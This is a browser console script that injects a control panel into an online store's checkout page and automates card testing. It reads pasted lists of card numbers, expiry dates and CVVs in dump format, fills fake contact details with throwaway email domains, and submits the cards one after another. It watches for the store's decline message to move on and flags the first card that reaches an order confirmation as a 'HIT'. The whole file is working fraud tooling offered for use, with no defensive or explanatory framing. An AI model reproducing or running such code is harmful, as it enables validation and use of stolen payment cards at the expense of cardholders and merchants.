(async function(){
    const UI_ID="slick-v6-precision-sync";
    const FAIL_TEXT="We are sorry, but we are unable to process your payment.";
    
    let existing=document.getElementById(UI_ID);
    if(existing){existing.remove()}
    
    let state={observer:null,queue:[],index:0,isRunning:false};
    window.slickLock = false; // THE SYNC LOCK
    
    const utils={
        randAlpha:(n)=>Array.from({length:n},()=>"abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random()*36)]).join(''),
        randName:()=>({
            f:["John","Jane","Peter","Mary","David","Susan","Michael","Linda","James","Maria"][Math.floor(Math.random()*10)],
            l:["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"][Math.floor(Math.random()*10)]
        }),
        randPhone:()=>{
            const r=(min,max)=>Math.floor(Math.random()*(max-min+1))+min;
            return `${r(2,9)}${Math.floor(Math.random()*100).toString().padStart(2,'0')}${r(2,9)}${Math.floor(Math.random()*1000000).toString().padStart(6,'0')}`
        },
        randEmail:function(){return `${this.randAlpha(10)}@${["remium.best","assetsreciever.xyz"][Math.floor(Math.random()*2)]}`},
        parseInput:(input)=>{
            if(input.trim().startsWith('[')){return JSON.parse(input.trim())}
            return input.trim().split('\n').map(line=>{
                const p=line.split('|');
                if(p.length<4){return null}
                return{card:p[0],month:p[1],year:p[2],cvv:p[3],zip:p[8]||"10001",raw:line}
            }).filter(c=>c!==null)
        },
        copy:(text)=>{
            try{
                if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(text);return true}
                const t=document.createElement("textarea");
                t.value=text;t.style.position="fixed";document.body.appendChild(t);t.select();
                const s=document.execCommand("copy");document.body.removeChild(t);return s
            }catch(err){return false}
        },
        simulateInput:(el,val)=>{
            if(!el){return}
            el.focus();el.dispatchEvent(new FocusEvent("focus",{bubbles:true}));
            el.value=val;el.dispatchEvent(new Event("input",{bubbles:true}));
            el.dispatchEvent(new Event("change",{bubbles:true}));
            el.blur();el.dispatchEvent(new FocusEvent("blur",{bubbles:true}))
        }
    };
    
    const updateStat=(txt,col)=>{const s=document.getElementById("af-stat");if(s){s.innerText=txt;s.style.color=col||"#888"}};
    
    function handleSuccess(){
        if(!state.isRunning){return}
        state.isRunning=false;
        if(state.observer){state.observer.disconnect()}
        
        const winningCard=state.queue[state.index-1];
        const orderData=sessionStorage.getItem("lastPlacedOrder");
        
        // DISPLAY CARD IN UI
        const sucBox=document.getElementById("af-success");
        if(sucBox){
            sucBox.style.display="block";
            sucBox.innerText=`SUCCESS!\nHIT CARD: ${winningCard?winningCard.raw:"Unknown"}`
        }
        updateStat("CHECKOUT SUCCESS","#0f0");
        
        // ONLY COPY DOMS DATA
        if(orderData){
            let domsText=`/doms data: ${ orderData }`;
            let copied=utils.copy(domsText);
            if(copied){alert("Payment Successful! Order Data Copied:\n\n"+domsText)}
            else{prompt("Payment Successful! Browser blocked copy. Press Ctrl+C:",domsText)}
        }else{
            alert("Payment Successful! (lastPlacedOrder not found in session)");
        }
    }
    
    function fillAndSubmit(card){
        if(!card){return}
        
        window.slickLock = true; // LOCK OBSERVER WHILE TYPING
        
        const radioBtn=document.getElementById('payment-type-card');
        const radioLabel=document.querySelector('label[for="payment-type-card"]');
        if(radioBtn&&!radioBtn.checked){
            radioBtn.click();radioBtn.dispatchEvent(new Event('change',{bubbles:true}));
            if(radioLabel){radioLabel.click()}
        }
        
        const map={cardNumber:card.card,cardExpirationDate:`${card.month }/${card.year }`,cardCVV:card.cvv,cardBillingZIPCode:card.zip};
        for(const[name,val]of Object.entries(map)){
            const el=document.querySelector(`input[name='${ name }']`);
            if(el){utils.simulateInput(el,val)}
        }
        
        setTimeout(()=>{
            const b=document.querySelector('button[type="submit"]');
            if(b&&!b.disabled){
                b.click();
                // Keep locked for 1.2s to wait for site loading spinner to pass
                setTimeout(() => { window.slickLock = false; }, 1200);
            } else {
                window.slickLock = false; // Unlock if button missing
            }
        },500)
    }
    
    function tryNext(){
        if(!state.isRunning){return}
        if(state.index>=state.queue.length){
            updateStat("FAILED ALL","#f44");
            state.isRunning=false;
            if(state.observer){state.observer.disconnect()}
            return
        }
        updateStat(`TRYING ${state.index+1}/${state.queue.length }`,"#ffac33");
        fillAndSubmit(state.queue[state.index]);
        state.index+=1
    }
    
    function startAll(){
        try{
            if(state.observer){state.observer.disconnect();state.observer=null}
            const raw=document.getElementById("af-txt").value;
            state.queue=utils.parseInput(raw);
            if(!state.queue.length){return}
            
            state.index=0;
            state.isRunning=true;
            window.slickLock = false; // Reset lock on start
            document.getElementById("af-success").style.display="none";
            
            if(document.getElementById("af-chk").checked){
                const n=utils.randName();
                const d={firstName:n.f,lastName:n.l,email:utils.randEmail(),phoneNumber:utils.randPhone()};
                Object.entries(d).forEach(([name,val])=>{
                    const el=document.querySelector(`input[name='${ name }']`);
                    if(el){utils.simulateInput(el,val)}
                })
            }
            
            state.observer=new MutationObserver((mutations)=>{
                // Success check happens REGARDLESS of lock
                const isConfirmed=Array.from(document.querySelectorAll('h1')).some(h1=>h1.textContent.includes("Order Confirmation"));
                const cardInputGone=document.querySelector("input[name='cardNumber']")===null;
                if(isConfirmed&&cardInputGone){handleSuccess();return}
                
                // IF LOCKED, DO NOT CHECK FOR ERRORS
                if(window.slickLock) return;
                
                let failDetected=false;
                for(const m of mutations){
                    if(m.type==="childList"&&m.addedNodes.length>0){
                        m.addedNodes.forEach(node=>{
                            if(node.nodeType===1&&node.textContent.includes(FAIL_TEXT)){
                                failDetected=true
                            }
                        })
                    }
                }
                
                if(failDetected&&state.isRunning){
                    window.slickLock = true; // Instantly lock to prevent double fire
                    tryNext()
                }
            });
            
            state.observer.observe(document.body,{childList:true,subtree:true});
            tryNext()
        }catch(e){alert("Format Error")}
    }
    
    const s=document.createElement("style");
    s.innerHTML=`#${ UI_ID } { position: fixed; top: 15px; right: 15px; width: 250px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; z-index: 999999; font-family: monospace; color: #eee; padding: 12px; } .af-h { cursor: move; font-size: 10px; color: #555; display: flex; justify-content: space-between; margin-bottom: 8px; } #af-txt { width: 100%; background: #000; border: 1px solid #222; color: #0f0; font-size: 10px; padding: 6px; box-sizing: border-box; } .af-b { display: flex; gap: 4px; margin-top: 8px; } .af-b button { flex: 1; font-size: 10px; padding: 6px; cursor: pointer; background: #111; color: #eee; border: 1px solid #444; } #af-success { display: none; background: #0b1a0b; border: 1px solid #238636; color: #0f0; font-size: 9px; padding: 6px; margin-top: 8px; word-break: break-all; }`;
    document.head.appendChild(s);
    
    const ui=document.createElement("div");
    ui.id=UI_ID;
    ui.innerHTML=`<div class="af-h" id="af-drag"><span>V6.7_DOMS_ONLY</span><span id="af-stat">IDLE</span></div><div style="font-size:9px;margin-bottom:5px">RAND_CONTACT <input type="checkbox" id="af-chk" checked></div><textarea id="af-txt" rows="5"></textarea><div class="af-b"><button id="af-run">RUN</button><button id="af-clr">CLR</button><button id="af-stop">STOP</button></div><div id="af-success"></div>`;
    document.body.appendChild(ui);
    
    document.getElementById("af-run").onclick=startAll;
    document.getElementById("af-clr").onclick=()=>document.getElementById("af-txt").value="";
    document.getElementById("af-stop").onclick=()=>{
        state.isRunning=false;
        window.slickLock = false; 
        if(state.observer){state.observer.disconnect();state.observer=null}
        updateStat("STOPPED","#f44")
    };
    
    let drag=false,off=[0,0];
    document.getElementById("af-drag").onmousedown=(e)=>{drag=true;off=[ui.offsetLeft-e.clientX,ui.offsetTop-e.clientY]};
    document.onmousemove=(e)=>{if(drag){ui.style.left=(e.clientX+off[0])+'px';ui.style.top=(e.clientY+off[1])+'px'}};
    document.onmouseup=()=>drag=false
})();

